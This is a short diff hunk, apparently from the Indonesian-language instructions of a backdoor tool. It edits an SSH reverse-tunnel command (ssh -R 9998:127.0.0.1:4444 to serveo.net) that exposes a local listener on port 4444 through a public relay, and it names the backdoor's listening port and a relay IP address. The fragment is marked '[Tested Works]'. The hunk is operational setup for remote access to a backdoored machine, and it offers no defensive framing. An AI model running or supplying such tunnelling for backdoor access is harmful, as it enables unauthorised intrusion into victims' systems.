@@ -32,7 +32,7 @@
 
 - Backdoor mendengarkan port 9998 dengan IP 159.89.214.31 dari seveo.net
 
-- [cmd] -> ssh -R 9998:127.0.0.1:4444 darksite@serveo.net
+- [cmd] -> ssh -R 9998:127.0.0.1:4444 serveo.net
 
 
 [Tested Works]
